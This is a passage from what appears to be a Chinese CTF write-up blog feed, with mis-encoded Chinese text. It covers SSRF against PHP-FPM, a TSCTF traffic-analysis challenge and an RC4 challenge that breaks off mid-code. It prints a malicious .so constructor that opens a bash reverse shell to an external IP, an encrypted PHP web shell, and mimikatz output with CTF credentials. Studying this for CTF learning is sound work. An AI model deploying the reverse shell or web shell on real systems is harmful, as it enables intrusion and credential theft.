src="https://img-blog.csdnimg.cn/20210603152428650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç° PHP-FPM ç»‘å®šåœ¨äº†æœ¬åœ° 9001 ç«¯å£ä¸Šã€‚</p><p>å¥½äº†ï¼Œæ—¢ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ eval() æ‰§è¡Œä»»æ„ä»£ç ï¼Œé‚£æˆ‘ä»¬ä¾¿å¯ä»¥æ„é€ æ¶æ„ä»£ç è¿›è¡Œ SSRFï¼Œåˆ©ç”¨ SSRF æ”»å‡»æœ¬åœ°çš„ PHP-FPMã€‚ä½†æ˜¯ç”±äºè¿™é‡Œç¦ç”¨äº†è®¸å¤šå‡½æ•°å’Œç±»ï¼Œåƒé‚£äº›æ™®é€šèƒ½æ„æˆ SSRF çš„å‡½æ•°å’Œç±»éƒ½æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ FTP åè®®æœªè¢«ç¦ç”¨ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ VPSä¸Šæ­å»ºæ¶æ„çš„FTPæœåŠ¡å™¨ï¼Œéª—å–ç›®æ ‡ä¸»æœºå°† Payload é‡å®šå‘åˆ°è‡ªå·±çš„ 9001 ç«¯å£ä¸Šï¼Œä»è€Œå®ç°æ”»å‡» PHP-FPM å¹¶æ‰§è¡Œå‘½ä»¤ã€‚</p><p>è¿™é‡Œåˆ©ç”¨äº† FTP åè®®å·¥ä½œæ–¹å¼ä¸­çš„è¢«åŠ¨æ–¹å¼ï¼Œåœ¨è¯¥æ–¹å¼ä¸­ï¼ŒFTP å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åœ¨å»ºç«‹æ§åˆ¶é€šé“çš„æ—¶å€™ç”¨äºŒè€…çš„TCP 21ç«¯å£å»ºç«‹è¿æ¥ï¼Œå»ºç«‹è¿æ¥åå‘é€ PASV å‘½ä»¤ã€‚FTP æœåŠ¡å™¨æ”¶åˆ° PASV å‘½ä»¤åï¼Œéšæœºæ‰“å¼€ä¸€ä¸ªé«˜ç«¯ç«¯å£ï¼ˆç«¯å£å·å¤§äº1024ï¼‰å¹¶ä¸”é€šçŸ¥å®¢æˆ·ç«¯åœ¨è¿™ä¸ªç«¯å£ä¸Šä¼ é€æ•°æ®çš„è¯·æ±‚ï¼Œå®¢æˆ·ç«¯è¿æ¥åˆ° FTP æœåŠ¡å™¨çš„æ­¤é«˜ç«¯ç«¯å£ï¼Œé€šè¿‡ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹é€šé“ï¼Œç„¶åFTPæœåŠ¡å™¨å°†é€šè¿‡è¿™ä¸ªç«¯å£è¿›è¡Œæ•°æ®çš„ä¼ é€ã€‚</p><p>é¦–å…ˆå°è¯•ä½¿ç”¨ Gopherus ç”Ÿæˆçš„æ”»å‡» PHP-FPM çš„ Payload å¤±è´¥ï¼Œç„¶åå°è¯•é€šè¿‡åŠ è½½æ¶æ„ .so æ‰©å±•çš„æ–¹å¼ã€‚ç½‘ä¸Šçš„è„šæœ¬.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br>__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">preload</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&#x27;&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p><a href="https://err0r.top/article/bluehat2021/">https://err0r.top/article/bluehat2021/</a><br><a href="http://bubb1e.com/2021/04/29/%E8%93%9D%E5%B8%BD%E6%9D%AF2021WP_WEB/#0x02-one-Pointer-php">http://bubb1e.com/2021/04/29/%E8%93%9D%E5%B8%BD%E6%9D%AF2021WP_WEB/#0x02-one-Pointer-php</a><br><a href="https://www.anquanke.com/post/id/233454">https://www.anquanke.com/post/id/233454</a><br><a href="https://xz.aliyun.com/t/9544#toc-6">https://xz.aliyun.com/t/9544#toc-6</a><br><a href="https://www.infoq.cn/article/vIcwtItzVK7B4YNOEj3e">https://www.infoq.cn/article/vIcwtItzVK7B4YNOEj3e</a></p>]]></content>
    
    
    <categories>
      
      <category>ssrf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TSCTFWP</title>
    <link href="/2021/05/24/2020-5-24-TSCTFWP/"/>
    <url>/2021/05/24/2020-5-24-TSCTFWP/</url>
    
    <content type="html"><![CDATA[<p>é—®å·å°±ä¸è¯´äº†</p><h4 id="Ohmypassword"><a href="#Ohmypassword" class="headerlink" title="Ohmypassword"></a>Ohmypassword</h4><p>è¿›å…¥æµé‡åŒ… è¿‡æ»¤å‡ºæ¥</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">http contains &quot;passwordâ€œ<br></code></pre></div></td></tr></table></figure><p>å³å¯çœ‹åˆ°</p><p><img src="https://img-blog.csdnimg.cn/20210524131625628.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿½è¸ªç¬¬ä¸€ä¸ªæµé‡åŒ…å³å¯å‘ç°åœ¨æœ€åä¸€éƒ¨åˆ†ä¸Šä¼ äº†ä¸€ä¸ªphpæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$key</span>=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$key</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br><span class="hljs-variable">$post</span>=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=openssl_decrypt(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=explode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>@<span class="hljs-keyword">new</span> C(<span class="hljs-variable">$params</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>å¾ˆå®¹æ˜“åˆ†æå‡ºæ¥ç”¨passä¼ å‚ç”Ÿæˆäº†ä¸€ä¸ªkeyï¼Œç„¶åphp://inputåè®®è·å–postæµä¸­çš„å†…å®¹ï¼Œå¯ä»¥è¿”ç°è¿™ä¸ªkeyæ˜¯ç”¨æ¥AESè§£å¯†çš„ï¼Œä¹‹åå¾ˆå®¹æ˜“æƒ³åˆ°è¿‡æ»¤å‡ºpasså…³é”®å­—<br><img src="https://img-blog.csdnimg.cn/20210524131859997.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”¨æœ€åå‡ºä¼ å…¥çš„passå€¼ç”Ÿæˆçš„keyï¼Œè¿½è¸ªæµå³å¯å‘ç°ç”Ÿæˆçš„key</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">key</span> = <span class="hljs-number">09</span>f<span class="hljs-number">2</span>d<span class="hljs-number">96615775182</span><br></code></pre></div></td></tr></table></figure><p>æœ‰äº†keyå°±å¯ä»¥å¯¹postæµä¸­çš„æ•°æ®æµè¿›è¡Œè§£å¯†ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// $key=substr(md5(uniqid(rand())),16);</span><br><span class="hljs-comment">// echo $key;</span><br><span class="hljs-variable">$post</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;09f2d96615775182&quot;</span>;<br><span class="hljs-comment">#$key = &quot;dadc0b42da0fd57d&quot;;</span><br><span class="hljs-variable">$post</span>=openssl_decrypt(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$post</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>$postå³ä¸ºpostæµä¸­çš„å†…å®¹,ä¹Ÿå¯ä»¥ä½¿æœåŠ¡å™¨å“åº”è¿”å›çš„å†…å®¹ã€‚æ¥ä¸‹æ¥å°±æ˜¯å¯¹æ‰¾å¯¹æµé‡åŒ…ã€‚è¿™ä¸ªè¿‡ç¨‹å¾ˆè‰°éš¾ï¼Œå› ä¸ºæµé‡åŒ…å¤ªå¤šäº†ã€‚æœ€åè¿‡æ»¤å‡ºhttpåè®®åœ¨åé¢ä¸€éƒ¨åˆ†æ‰¾åˆ°äº†å¯¹çš„æµé‡åŒ…ã€‚ç¬¬ä¸€ä¸ªåœ¨3682çš„æµé‡åŒ…,è§£å¯†å¦‚ä¸‹</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada"><span class="hljs-keyword">type</span> <span class="hljs-type">password1.txt</span><br><span class="hljs-type"></span><br><span class="hljs-type">  </span>.#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> Sep <span class="hljs-number">18</span> <span class="hljs-number">2020</span> <span class="hljs-number">19</span>:<span class="hljs-number">18</span>:<span class="hljs-number">29</span><br> .## ^ ##.  <span class="hljs-string">&quot;A La Vie, A L&#x27;Amour&quot;</span> - (oe.eo)<br> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz<br> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )<br>  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/<br><br>mimikatz(commandline) # privilege::debug<br>Privilege &#x27;<span class="hljs-number">20</span>&#x27; OK<br><br>mimikatz(commandline) # sekurlsa::logonpasswords<br><br>Authentication Id : 0 ; <span class="hljs-number">666554</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000</span>a2bba)<br>Session           : <span class="hljs-type">Interactive</span> from <span class="hljs-number">1</span><br>User Name         : 23333<br>Domain            : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Server      : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Time        : 2021/5/3 16:11:10<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1594512008</span>-<span class="hljs-number">2047613387</span>-<span class="hljs-number">837257493</span>-<span class="hljs-number">1000</span><br>msv :<br> [<span class="hljs-number">00000003</span>] Primary<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * LM       : 5<span class="hljs-type">c651cac55ccdc3cd210ce269f6f8d13</span><br> * NTLM     : 922<span class="hljs-type">ce1a39b00c1d9d929dfd31d9f2c1f</span><br> * SHA1     : 7<span class="hljs-type">a6fdaedc33598705c1690da021bb69d0aaef9c0</span><br>tspkg :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>wdigest :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>kerberos :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">666412</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000</span>a2b2c)<br>Session           : <span class="hljs-type">Interactive</span> from <span class="hljs-number">1</span><br>User Name         : 23333<br>Domain            : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Server      : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Time        : 2021/5/3 16:11:10<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1594512008</span>-<span class="hljs-number">2047613387</span>-<span class="hljs-number">837257493</span>-<span class="hljs-number">1000</span><br>msv :<br> [<span class="hljs-number">00000003</span>] Primary<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * LM       : 5<span class="hljs-type">c651cac55ccdc3cd210ce269f6f8d13</span><br> * NTLM     : 922<span class="hljs-type">ce1a39b00c1d9d929dfd31d9f2c1f</span><br> * SHA1     : 7<span class="hljs-type">a6fdaedc33598705c1690da021bb69d0aaef9c0</span><br>tspkg :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>wdigest :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>kerberos :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">997</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e5</span>)<br>Session           : <span class="hljs-type">Service</span> from <span class="hljs-number">0</span><br>User Name         : <span class="hljs-type">LOCAL</span> SERVICE<br>Domain            : <span class="hljs-type">NT</span> AUTHORITY<br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:57<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">19</span><br>msv :<br>tspkg :<br>wdigest :<br> * Username : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Domain   : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>kerberos :<br> * Username : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Domain   : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">996</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e4</span>)<br>Session           : <span class="hljs-type">Service</span> from <span class="hljs-number">0</span><br>User Name         : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br>Domain            : <span class="hljs-type">WORKGROUP</span><br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:57<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">20</span><br>msv :<br>tspkg :<br>wdigest :<br> * Username : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>kerberos :<br> * Username : <span class="hljs-type">win</span>-ovth665jqc3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">48274</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0000</span>bc92)<br>Session           : <span class="hljs-type">UndefinedLogonType</span> from <span class="hljs-number">0</span><br>User Name         : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Domain            : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:56<br>SID               : <br>msv :<br>tspkg :<br>wdigest :<br>kerberos :<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">999</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e7</span>)<br>Session           : <span class="hljs-type">UndefinedLogonType</span> from <span class="hljs-number">0</span><br>User Name         : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br>Domain            : <span class="hljs-type">WORKGROUP</span><br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:56<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">18</span><br>msv :<br>tspkg :<br>wdigest :<br> * Username : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>kerberos :<br> * Username : <span class="hljs-type">win</span>-ovth665jqc3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>ssp :<br>credman :<br><br>mimikatz(commandline) # <span class="hljs-keyword">exit</span><br>Bye!<br><br>C:\phpstudy_pro\WWW\TEST\hackable\uploads&gt;<br></code></pre></div></td></tr></table></figure><p>ç¬¬äºŒä¸ªæµé‡åŒ…ä½ç½®å¿˜è®°äº†ï¼Œè§£å¯†åçš„å†…å®¹å¦‚ä¸‹</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">23333</span> HACKING_TO_THE_GATE<br>å‘½ä»¤æˆåŠŸå®Œæˆã€‚<br></code></pre></div></td></tr></table></figure><p>ç”±æ­¤å¯å¾—å‡ºflag:TSCTF{EL_PSY_CONGROO_HACKING_TO_THE_GATE}</p><h3 id="HelloRc4"><a href="#HelloRc4" class="headerlink" title="HelloRc4"></a>HelloRc4</h3><p>è¿™é¢˜çœ‹æ‡‚äº†æºç å°±ç€å®å¾ˆç®€å•ã€‚åˆ†æä¸€ä¸‹æºç å¯ä»¥çŸ¥é“ã€‚å…ˆè¿›è¡Œäº†ä¸€ä¸ªsha256éªŒè¯ï¼Œç›´æ¥æ‹¿è„šæœ¬è·‘å°±è¡Œäº†ï¼Œç„¶åè¿›å…¥åˆ°MyPrngç±»ä¸­åœ¨ä¸‹é¢è¿™ä¸ªä»£ç ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyPrng</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span> <span class="hljs-comment">#åˆ›å»ºä¸´æ—¶å‘é‡Tï¼ˆ256ä½ï¼‰</span><br>        self.state  = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]<br>        self.i      = <span class="hljs-number">0</span><br>        self.j      = <span class="hljs-number">0</span><br>        self.k      = <span class="hljs-number">0</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__swap_state</span>(<span class="hljs-params">self, a, b</span>):</span><br>        self.state[a], self.state[b] = self.state[b], self.state[a]  <span class="hljs-comment">#æ¯äº§ç”Ÿä¸€ä¸ªå­—èŠ‚kï¼ŒSçš„å…ƒç´ éƒ½è¦è¢«å†æ¬¡æ’åˆ—</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ksa</span>(<span class="hljs-params">self, key</span>):</span><br>        j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            j = (j + self.state[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>            <span class="hljs-built_in">list</span>.append([i,j])<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>                <span class="hljs-keyword">if</span>(p[<span class="hljs-number">0</span>]==j <span class="hljs-keyword">and</span> p[<span class="hljs-number">1</span>]==i):<br>                    <span class="hljs-built_in">print</span>(p[<span class="hljs-number">0</span>],p[<span class="hljs-number">1</span>],i,j,<span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]))<br>            self.__swap_state(i, j) <span class="hljs-comment">#äº¤æ¢å…ƒç´ </span><br>        k = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span 